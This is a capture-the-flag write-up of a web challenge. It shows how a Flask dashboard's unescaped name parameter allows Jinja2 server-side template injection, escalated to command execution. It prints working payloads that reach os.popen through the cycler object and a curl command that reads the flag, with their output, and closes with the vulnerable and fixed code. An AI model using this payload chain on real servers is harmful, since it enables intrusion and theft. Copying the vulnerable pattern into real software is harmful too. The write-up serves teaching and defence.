# Template Tide — Writeup

- **Category:** Web
- **Points:** 10
- **Flag:** `rstcon{ssti_rolls_in_with_the_t1de}`
- **Description:** *The hydro dashboard has a friendly little tide report that greets
  you by name. It is a bit too friendly with what you give it.*
- **Target:** `http://18.215.143.250:5001` (Mirror 2: `http://18.145.136.91:5001`)

## TL;DR

The dashboard personalizes a tide report with a `?name=` parameter and drops it,
unescaped, into a **Jinja2** template — `Tide report for {{ name }}`. That's a
textbook **Server-Side Template Injection (SSTI)**. `{{7*7}}` renders `49`, which
escalates straight to RCE through Jinja's object graph. `flag.txt` sits in the
app's working directory.

## Recon

The homepage is a Flask app behind gunicorn (`Server: gunicorn`). The report
panel ends with a form and, helpfully, prints its own template source:

```html
<form class="personalize" method="get" action="/">
  <input id="name-input" type="text" name="name" ...>
</form>

<div class="embed">
  <span class="embed-label">Report template</span>
  <code>Tide report for {{ name }}</code>
</div>
```

So user input flows into a `{{ ... }}` expression. The description's "too friendly
with what you give it" is pointing right at it.

## The vulnerability

The server builds the page by rendering the `name` value *as template source*
rather than passing it as template *data* — the classic Flask SSTI footgun, e.g.:

```python
# vulnerable shape
render_template_string(f"Tide report for {name}")   # name is attacker-controlled
```

Because the string is compiled by Jinja2, `{{ expression }}` is evaluated on the
server. Confirm with arithmetic:

```
?name={{7*7}}   ->   Tide report for 49
```

A literal `49` (not `{{7*7}}`) means the expression was evaluated server-side.

## Escalating to RCE

Jinja2 sandboxing is not in play here, so we can walk from any accessible object
to Python's `os` module via `__globals__`. The `cycler` global is a reliable
gadget:

```
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```

```
Tide report for uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
```

Listing the working directory shows the flag right next to the app:

```
{{ cycler.__init__.__globals__.os.popen('ls -la').read() }}
```

```
-rw-rw-r-- 1 ctf  ctf  1161 Oct 17 21:00 app.py
-rw-rw-r-- 1 ctf  ctf    36 Oct 17 21:00 flag.txt
-rw-rw-r-- 1 ctf  ctf    30 Oct 17 23:27 requirements.txt
drwxr-xr-x 1 ctf  ctf  4096 Oct 17 21:00 static
drwxr-xr-x 1 ctf  ctf  4096 Oct 17 21:00 templates
```

## Exploit

```bash
# ?name= value, URL-encoded by curl's --data-urlencode
curl -s -G 'http://18.215.143.250:5001/' \
  --data-urlencode "name={{ cycler.__init__.__globals__.os.popen('cat flag.txt').read() }}" \
  | grep -i 'Tide report for'
```

```
Tide report for rstcon{ssti_rolls_in_with_the_t1de}
```

See [`solves/template-tide/solve.sh`](../solves/template-tide/solve.sh) for the
full chain (confirm -> `id` -> `ls` -> `cat flag.txt`).

## Flag

```
rstcon{ssti_rolls_in_with_the_t1de}
```

## Takeaway

**Never build a template from untrusted input.** User data belongs in the
template *context*, not the template *source*:

```python
# safe: name is data, auto-escaped, never compiled as template
render_template("report.html", name=name)
# or, for a string template:
render_template_string("Tide report for {{ name }}", name=name)
```

If dynamic templates from untrusted sources are truly unavoidable, use a
sandboxed environment (`jinja2.sandbox.SandboxedEnvironment`) — but that only
narrows the attack surface and has its own bypass history; keeping input out of
the template source is the real fix.
